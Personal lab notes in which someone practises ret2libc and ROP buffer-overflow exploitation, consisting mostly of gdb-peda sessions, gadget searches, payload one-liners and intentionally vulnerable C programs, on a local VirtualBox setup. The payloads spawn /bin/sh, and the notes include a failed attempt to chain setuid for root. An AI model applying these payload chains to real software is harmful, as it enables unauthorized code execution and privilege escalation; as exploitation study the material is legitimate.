gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f"'`
Starting program: /home/lasalle/workspaces19/ret2libc/bug `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f"'`
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB@4���

[----------------------------------registers-----------------------------------]
RAX: 0x95 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Hello ", 'A' <repeats 128 times>, "BBBBBBBB@4\243\367\377\177\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdee8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
RIP: 0x400579 (<bug+66>:	ret)
R8 : 0x0 
R9 : 0x8e 
R10: 0xffffff72 
R11: 0x246 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfe0 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400572 <bug+59>:	call   0x400440 <printf@plt>
   0x400577 <bug+64>:	nop
   0x400578 <bug+65>:	leave  
=> 0x400579 <bug+66>:	ret    
   0x40057a <main>:	push   rbp
   0x40057b <main+1>:	mov    rbp,rsp
   0x40057e <main+4>:	sub    rsp,0x10
   0x400582 <main+8>:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee8 --> 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
0008| 0x7fffffffdef0 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
0016| 0x7fffffffdef8 --> 0x300000000 
0024| 0x7fffffffdf00 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
0032| 0x7fffffffdf08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0040| 0x7fffffffdf10 --> 0x3 
0048| 0x7fffffffdf18 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
0056| 0x7fffffffdf20 --> 0x300008000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400579 in bug ()
gdb-peda$ si

[----------------------------------registers-----------------------------------]
RAX: 0x95 
RBX: 0x0 
RCX: 0x0 
RDX: 0x0 
RSI: 0x602260 ("Hello ", 'A' <repeats 128 times>, "BBBBBBBB@4\243\367\377\177\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdef0 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
RIP: 0x7ffff7a33440 (<__libc_system>:	test   rdi,rdi)
R8 : 0x0 
R9 : 0x8e 
R10: 0xffffff72 
R11: 0x246 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfe0 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a33439 <cancel_handler+217>:	pop    rbx
   0x7ffff7a3343a <cancel_handler+218>:	ret    
   0x7ffff7a3343b:	nop    DWORD PTR [rax+rax*1+0x0]
=> 0x7ffff7a33440 <__libc_system>:	test   rdi,rdi
   0x7ffff7a33443 <__libc_system+3>:	je     0x7ffff7a33450 <__libc_system+16>
   0x7ffff7a33445 <__libc_system+5>:	jmp    0x7ffff7a32eb0 <do_system>
   0x7ffff7a3344a <__libc_system+10>:	nop    WORD PTR [rax+rax*1+0x0]
   0x7ffff7a33450 <__libc_system+16>:	lea    rdi,[rip+0x164a4b]        # 0x7ffff7b97ea2
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdef0 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
0008| 0x7fffffffdef8 --> 0x300000000 
0016| 0x7fffffffdf00 --> 0x4005d0 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffdf08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0032| 0x7fffffffdf10 --> 0x3 
0040| 0x7fffffffdf18 --> 0x7fffffffdfe8 --> 0x7fffffffe325 ("/home/lasalle/workspaces19/ret2libc/bug")
0048| 0x7fffffffdf20 --> 0x300008000 
0056| 0x7fffffffdf28 --> 0x40057a (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
__libc_system (line=0x1 <error: Cannot access memory at address 0x1>) at ../sysdeps/posix/system.c:180
180	../sysdeps/posix/system.c: No such file or directory.


gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ 


gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f","\x2f\x62\x69\x6e\x2f\x73\x68"'`

"\x2f\x62\x69\x6e\x2f\x73\x68"

Thread 2.1 "bug" received signal SIGSEGV, Segmentation fault.
[Switching to process 11319]

[----------------------------------registers-----------------------------------]
RAX: 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')
RBX: 0x0 
RCX: 0x7ffff7b97e9f --> 0x2074697865006873 ('sh')
RDX: 0x0 
RSI: 0x7ffff7dd16a0 --> 0x0 
RDI: 0x2 
RBP: 0x7fffffffdda8 --> 0x0 
RSP: 0x7fffffffdd48 --> 0x0 
RIP: 0x7ffff7a332f6 (<do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0)
R8 : 0x7ffff7dd1600 --> 0x0 
R9 : 0x8e 
R10: 0x8 
R11: 0x246 
R12: 0x1 
R13: 0x7fffffffdfd0 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7a332e6 <do_system+1078>:	movq   xmm0,QWORD PTR [rsp+0x8]
   0x7ffff7a332ec <do_system+1084>:	mov    QWORD PTR [rsp+0x8],rax
   0x7ffff7a332f1 <do_system+1089>:	movhps xmm0,QWORD PTR [rsp+0x8]
=> 0x7ffff7a332f6 <do_system+1094>:	movaps XMMWORD PTR [rsp+0x40],xmm0
   0x7ffff7a332fb <do_system+1099>:	call   0x7ffff7a23110 <__GI___sigaction>
   0x7ffff7a33300 <do_system+1104>:	lea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 <quit>
   0x7ffff7a33307 <do_system+1111>:	xor    edx,edx
   0x7ffff7a33309 <do_system+1113>:	mov    edi,0x3
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd48 --> 0x0 
0008| 0x7fffffffdd50 --> 0x7ffff7b97e97 --> 0x2f6e69622f00632d ('-c')
0016| 0x7fffffffdd58 --> 0x7ffff7a48f26 (<__printf+166>:	mov    rcx,QWORD PTR [rsp+0x18])
0024| 0x7fffffffdd60 --> 0x10 
0032| 0x7fffffffdd68 --> 0x7ffff7a33360 (<cancel_handler>:	push   rbx)
0040| 0x7fffffffdd70 --> 0x7fffffffdd64 --> 0xf7a3336000000000 
0048| 0x7fffffffdd78 --> 0xd710d0935f41f200 
0056| 0x7fffffffdd80 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007ffff7a332f6 in do_system (line=0x1 <error: Cannot access memory at address 0x1>)
    at ../sysdeps/posix/system.c:125
125	in ../sysdeps/posix/system.c

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x62\x06\x40\x00\x00\x00\x00\x00","\x40\x34\xa3\xf7\xff\x7f","\x20\x71\xa2\xf7\xff\x7f","\x2f\x62\x69\x6e\x2f\x73\x68"'`


https://www.tiandiwuji.top/posts/32791/

0x 00 00 00 00 00 40 06 62: pop r15; ret;


"\x62\x06\x40\x00\x00\x00\x00\x00"


https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
sys_execve
sys_execve	const char *filename	const char *const argv[]	const char *const envp[]

%rax	System call	%rdi	%rsi	%rdx


https://jameshfisher.com/2017/02/05/how-do-i-use-execve-in-c/

exec.c
#include <stdio.h>
#include <unistd.h>
int main(void) {
  printf("Main program started\n");
  char* argv[] = { NULL };
  char* envp[] = { NULL };
  execve("/bin/sh", argv, envp);
  perror("Could not execve");
  return 1;
}

cc main.c -o main

pop rdi  /bin/sh
pop rsi  0h - NULL
pop rax. 0h - NULL

mov rsi, rax

Guessed arguments:
arg[0]: 0x555555554794 --> 0x68732f6e69622f ('/bin/sh')
arg[1]: 0x7fffffffdf88 --> 0x0 
arg[2]: 0x7fffffffdf90 --> 0x0

=> 0x7ffff7ac8e30 <execve>:	mov    eax,0x3b
   0x7ffff7ac8e35 <execve+5>:	syscall 

https://jameshfisher.com/2017/02/05/how-do-i-use-execve-in-c/

lasalle@lasalle-VirtualBox:~/workspaces19/ret2libc$ cat exec2.c 
#include <stdio.h>
#include <unistd.h>
int main(void) {
  char* argv[] = { NULL };
  char* envp[] = { NULL };
  execve("/bin/sh", argv, envp);
  return 0;
}

gdb-peda$ disas main
Dump of assembler code for function main:
   0x00000000000006aa <+0>:	push   rbp
   0x00000000000006ab <+1>:	mov    rbp,rsp
   0x00000000000006ae <+4>:	sub    rsp,0x20
   0x00000000000006b2 <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000000006bb <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000000006bf <+21>:	xor    eax,eax
   0x00000000000006c1 <+23>:	mov    QWORD PTR [rbp-0x18],0x0
   0x00000000000006c9 <+31>:	mov    QWORD PTR [rbp-0x10],0x0
   0x00000000000006d1 <+39>:	lea    rdx,[rbp-0x10]
   0x00000000000006d5 <+43>:	lea    rax,[rbp-0x18]
   0x00000000000006d9 <+47>:	mov    rsi,rax
   0x00000000000006dc <+50>:	lea    rdi,[rip+0xb1]        # 0x794
   0x00000000000006e3 <+57>:	call   0x580 <execve@plt>
   0x00000000000006e8 <+62>:	mov    eax,0x0
   0x00000000000006ed <+67>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000000006f1 <+71>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000000006fa <+80>:	je     0x701 <main+87>
   0x00000000000006fc <+82>:	call   0x570 <__stack_chk_fail@plt>
   0x0000000000000701 <+87>:	leave  
   0x0000000000000702 <+88>:	ret    
End of assembler dump.

hello.asm

section .rodata
    format: db 'Hello %s', 10, 0
    name:   db 'Conrad', 0

section .text
        global main
        extern printf
    main:
        ; printf(format, name)
        mov rdi, format
        mov rsi, name
        ; no XMM registers
        mov rax, 0
        call printf
        ; return 0
        mov rax, 0
        ret

https://stackoverflow.com/questions/38335212/calling-printf-in-x86-64-using-gnu-assembler/38335743

call printf@plt  or -no-pie in gcc

position independent issue

$ ./hello 
./hello: Symbol `printf' causes overflow in R_X86_64_PC32 relocation
Segmentation fault (core dumped)

nasm hello.s -f elf64 -o hello.o && gcc -m64 -no-pie -o hello hello.o
nasm execve.s -f elf64 -o execve.o && gcc -m64 -no-pie -o execve execve.o

$ ./execve 
$ whoami
lasalle
$ 

$ cat execve.s 
section .rodata
    sh: db '/bin/sh'

section .text
        global main
        extern execve
    main:
        ; execve('/bin/sh', NULL, NULL)
        mov rdi, sh
        mov rsi, 0
        mov rax, 0
        call execve

        ; return 0
        mov rax, 0
        ret

gdb-peda$ p execve
$1 = {<text variable, no debug info>} 0x7ffff7ac8e30 <execve>
gdb-peda$ 

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x30\x8e\xac\xf7\xff\x7f"'`

ret is pop rip

pop the value of stack to rip which is execve

before that populate rdi, rsi and rax 

push address to stack, 

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ 

ropper --file ret2libc --search "% pop"
0x0000000000400661: pop rsi; pop r15; ret;

ropper --file ret2libc --search "% rdi"
0x0000000000400663: pop rdi; ret; 

gdb-peda$ p execve
$1 = {<text variable, no debug info>} 0x7ffff7ac8e30 <execve>
gdb-peda$ 

0x0000000000 40 06 33: pop rdi; ret;  and pop execve 

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x33\x06\x40","\x00\x00\x00\x00\x00\x00","\x30\x8e\xac\xf7\xff\x7f"'`

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x61\x06\x40\x00\x00\x00","\x30\x8e\xac\xf7\xff\x7f"'`

dumprop
Writing ROP gadgets to file: bug-rop.txt ...
0x40051a: ret
0x400480: repz ret
0x400578: leave; ret
0x4004b8: pop rbp; ret
0x400633: pop rdi; ret ---> we  need this one

r `perl -e 'print "A"x128,"B"x32,"\x30\x8e\xac\xf7\xff\x7f","\x33\x06\x40"'`

0000| 0x7fffffffdef8 --> 0x7ffff7ac8e30 (<execve>:	mov    eax,0x3b)

gdb-peda$ ropsearch
Error: missing argument
Search for ROP gadgets in memory
    Note: only for simple gadgets, for full ROP search try: http://ropshell.com
Usage:
    ropsearch "gadget" start end
    ropsearch "gadget" pagename

gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400633 : (b'5fc3')	pop rdi; ret
gdb-peda$ 

gdb-peda$ r `perl -e 'print "A"x128,"B"x8,"\x33\x06\x40","C"x5,"\x30\x8e\xac\xf7\xff\x7f"'`

null byte is not possible on strcpy because it is from command line argument and it strips off \x00

now moving to ret2lib.c again to use read logic instead of strcpy.


bug2.c

#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

gcc -no-pie -fno-stack-protector bug2.c -o bug2


$ ./bug2 
aaaaaaaaaaaa

Read 13 bytes. buf is aaaaaaaaaaaa

No shell for you :(
```


## Using tiandiwuji

```

https://www.tiandiwuji.top/posts/32791/

gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x0000000000400470  _init
0x00000000004004a0  puts@plt
0x00000000004004b0  system@plt
0x00000000004004c0  read@plt
0x00000000004004d0  exit@plt
0x00000000004004e0  _start
0x0000000000400510  _dl_relocate_static_pie
0x0000000000400520  deregister_tm_clones
0x0000000000400550  register_tm_clones
0x0000000000400590  __do_global_dtors_aux
0x00000000004005c0  frame_dummy
0x00000000004005c7  shell
0x00000000004005e6  main
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini

python -c "print 'A' * 280 + '\xc7\x05\x40\x00\x00\x00\x00\x00'" > temp

python -c "print 'A' * 280 + '\x38\x06\x40\x00\x00\x00\x00\x00' + '\xc7\x05\x40\x00\x00\x00\x00\x00'" > temp

$ (cat temp;cat) | ./vuln
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8@
whoami
lasalle


lasalle@lasalle-VirtualBox:~/workspaces19/vuln2$ (cat temp;cat) | ./vuln
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8@
w
 15:19:54 up 13:31,  1 user,  load average: 0.04, 0.06, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
lasalle  :0       :0               Sun17   ?xdm?   6:59   0.02s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHEL
whoami
lasalle
exit

#include<stdio.h>
#include <string.h>

/* Eventhough shell() function isnt invoked directly, its needed
   here since 'system@PLT' and 'exit@PLT' stub code should be pres
   ent in executable to successfully exploit it. */

void shell() {
	system("/bin/sh");
	exit(0);
}

int main(int argc, char* argv[]) {
	int i=0;
	char buf[256];
	read(0, buf, 500);
	printf("%s\n",buf);
	return 0;
}

Dump of assembler code for function main:
   0x00000000004005e6 <+0>:	push   rbp
   0x00000000004005e7 <+1>:	mov    rbp,rsp
=> 0x00000000004005ea <+4>:	sub    rsp,0x120
   0x00000000004005f1 <+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x00000000004005f7 <+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x00000000004005fe <+24>:	mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400605 <+31>:	lea    rax,[rbp-0x110]
   0x000000000040060c <+38>:	mov    edx,0x1f4
   0x0000000000400611 <+43>:	mov    rsi,rax
   0x0000000000400614 <+46>:	mov    edi,0x0
   0x0000000000400619 <+51>:	mov    eax,0x0
   0x000000000040061e <+56>:	call   0x4004c0 <read@plt>
   0x0000000000400623 <+61>:	lea    rax,[rbp-0x110]
   0x000000000040062a <+68>:	mov    rdi,rax
   0x000000000040062d <+71>:	call   0x4004a0 <puts@plt>
   0x0000000000400632 <+76>:	mov    eax,0x0
   0x0000000000400637 <+81>:	leave  
   0x0000000000400638 <+82>:	ret    
End of assembler dump.

https://www.tiandiwuji.top/posts/32791/

pattern_create 300

#include<stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
        system("/bin/sh");
        exit(0);
	return 0;
}

Dump of assembler code for function main:
   0x0000000000400537 <+0>:	push   rbp
   0x0000000000400538 <+1>:	mov    rbp,rsp
   0x000000000040053b <+4>:	sub    rsp,0x10
   0x000000000040053f <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400542 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400546 <+15>:	lea    rdi,[rip+0xa7]        # 0x4005f4
   0x000000000040054d <+22>:	mov    eax,0x0
   0x0000000000400552 <+27>:	call   0x400430 <system@plt>
   0x0000000000400557 <+32>:	mov    edi,0x0
   0x000000000040055c <+37>:	call   0x400440 <exit@plt>

gcc -no-pie -fno-stack-protector vuln2.c -o vuln2

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x400570 (<__libc_csu_init>:	push   r15)
RDX: 0x7fffffffe098 --> 0x7fffffffe3e6 ("CLUTTER_IM_MODULE=xim")
RSI: 0x7fffffffe088 --> 0x7fffffffe3bf ("/home/lasalle/workspaces19/vuln2/vuln2")
RDI: 0x4005f4 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffdfa0 --> 0x400570 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffdf90 --> 0x7fffffffe088 --> 0x7fffffffe3bf ("/home/lasalle/workspaces19/vuln2/vuln2")
RIP: 0x400552 (<main+27>:	call   0x400430 <system@plt>)
R8 : 0x7ffff7dd0d80 --> 0x0 
R9 : 0x7ffff7dd0d80 --> 0x0 
R10: 0x0 
R11: 0x0 
R12: 0x400450 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe080 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400542 <main+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x400546 <main+15>:	lea    rdi,[rip+0xa7]        # 0x4005f4
   0x40054d <main+22>:	mov    eax,0x0
=> 0x400552 <main+27>:	call   0x400430 <system@plt>
   0x400557 <main+32>:	mov    edi,0x0
   0x40055c <main+37>:	call   0x400440 <exit@plt>
   0x400561:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x40056b:	nop    DWORD PTR [rax+rax*1+0x0]
Guessed arguments:
arg[0]: 0x4005f4 --> 0x68732f6e69622f ('/bin/sh')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf90 --> 0x7fffffffe088 --> 0x7fffffffe3bf ("/home/lasalle/workspaces19/vuln2/vuln2")
0008| 0x7fffffffdf98 --> 0x100000000 
0016| 0x7fffffffdfa0 --> 0x400570 (<__libc_csu_init>:	push   r15)
0024| 0x7fffffffdfa8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:	mov    edi,eax)
0032| 0x7fffffffdfb0 --> 0x1 
0040| 0x7fffffffdfb8 --> 0x7fffffffe088 --> 0x7fffffffe3bf ("/home/lasalle/workspaces19/vuln2/vuln2")
0048| 0x7fffffffdfc0 --> 0x100008000 
0056| 0x7fffffffdfc8 --> 0x400537 (<main>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

$ cat system.s 
section .rodata
    sh: db '/bin/sh'

section .text
        global main
        extern system
    main:
        ; system('/bin/sh', NULL, NULL)
        mov rdi, sh
        mov rsi, 0
        mov eax, 0
        call system
        ; return 0
        mov rax, 0
        ret

nasm system.s -f elf64 -o system.o && gcc -m64 -no-pie -o system system.o

source

$ cat bug2.c 
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

```

## Bug3 with setuid - not working

```
making it root


#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    setuid(0);
    seteuid(0);
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

gcc -no-pie -fno-stack-protector bug3.c -o bug3

   0x0000000000400669 <+98>:	mov    eax,0x0
   0x000000000040066e <+103>:	leave  
   0x000000000040066f <+104>:	ret    
End of assembler dump.
gdb-peda$ b *main+104
Breakpoint 1 at 0x40066f
gdb-peda$ 

gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x004006d3 : (b'5fc3')	pop rdi; ret

python -c "print 'A' * 96 + 'B' * 8 + '\xd3\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' " > temp

gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ 


gdb-peda$ ropsearch "pop rsi"
Searching for ROP gadget: 'pop rsi' in: binary ranges
0x004006d1 : (b'5e415fc3')	pop rsi; pop r15; ret
gdb-peda$ 

python -c "print 'A' * 96 + 'B' * 8 + '\xd3\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\xd1\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' " > temp

gdb-peda$ p execve
$2 = {<text variable, no debug info>} 0x7ffff7ac8e30 <execve>

python -c "print 'A' * 96 + 'B' * 8 + '\xd3\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\xd1\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af4154 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dd18c0 --> 0x0 
RSI: 0x602260 ("No shell for you :(\nis ", 'A' <repeats 92 times>, "\231\n")
RDI: 0x1 
RBP: 0x4242424242424242 ('BBBBBBBB')
RSP: 0x7fffffffdfb8 --> 0x4006d3 (<__libc_csu_init+99>:	pop    rdi)
RIP: 0x40066f (<main+104>:	ret)
R8 : 0x7ffff7fde4c0 (0x00007ffff7fde4c0)
R9 : 0x5d (']')
R10: 0x3 
R11: 0x246 
R12: 0x400520 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400664 <main+93>:	call   0x4004d0 <puts@plt>
   0x400669 <main+98>:	mov    eax,0x0
   0x40066e <main+103>:	leave  
=> 0x40066f <main+104>:	ret    
   0x400670 <__libc_csu_init>:	push   r15
   0x400672 <__libc_csu_init+2>:	push   r14
   0x400674 <__libc_csu_init+4>:	mov    r15,rdx
   0x400677 <__libc_csu_init+7>:	push   r13
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfb8 --> 0x4006d3 (<__libc_csu_init+99>:	pop    rdi)
0008| 0x7fffffffdfc0 --> 0x7ffff7b97e9a --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffdfc8 --> 0x4006d1 (<__libc_csu_init+97>:	pop    rsi)
0024| 0x7fffffffdfd0 --> 0x0 
0032| 0x7fffffffdfd8 --> 0x0 
0040| 0x7fffffffdfe0 --> 0x7ffff7ac8e30 (<execve>:	mov    eax,0x3b)
0048| 0x7fffffffdfe8 --> 0x9bd2de92ced5820a 
0056| 0x7fffffffdff0 --> 0x400520 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040066f in main ()
gdb-peda$ 

0x00007ffff7ac8e35	78	in ../sysdeps/unix/syscall-template.S
gdb-peda$ si
process 13037 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Inferior 1 (process 13037) exited normally]
Warning: not running

did not work for root. using bug2.c to and chain setuid

Breakpoint 1, 0x000000000040057b in main ()
gdb-peda$ p setuid
$1 = {int (uid_t)} 0x7ffff7ac9970 <__setuid>
gdb-peda$ 

bug3.c helps as edi is 0

   0x0000000000400616 <+15>:	mov    edi,0x0
   0x000000000040061b <+20>:	call   0x400500 <setuid@plt>
   0x0000000000400620 <+25>:	mov    edi,0x0
   0x0000000000400625 <+30>:	call   0x400510 <seteuid@plt>

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\x31\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

$ (cat temp;cat) | ./bug2

Read 153 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(
whoami
lasalle

gdb-peda$ p setuid
$1 = {int (uid_t)} 0x7ffff7ac9970 <__setuid>
gdb-peda$ 


gdb-peda$ p seteuid
$2 = {int (uid_t)} 0x7ffff7afac00 <__GI_seteuid>
gdb-peda$ 

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\x31\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

setuid
'\x70\x99\xac\xf7\xff\x7f\x00\x00'

python -c "print 'A' * 96 + 'B' * 8 + '\x33\x06\x40\x00\x00\x00\x00\x00' + '\x9a\x7e\xb9\xf7\xff\x7f\x00\x00' + '\x31\x06\x40\x00\x00\x00\x00\x00' + '\x00\x00\x00\x00\x00\x00\x00\x00' + '\x70\x99\xac\xf7\xff\x7f\x00\x00' + '\x30\x8e\xac\xf7\xff\x7f\x00\x00'" > temp

needs rdi

'\x00\x00\x00\x00\x00\x00\x00\x00'

gdb-peda$ b *main+84
Breakpoint 1 at 0x4005cb

gdb-peda$ b *main+84
Breakpoint 1 at 0x4005cb

gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400633 : (b'5fc3')	pop rdi; ret
gdb-peda$ 

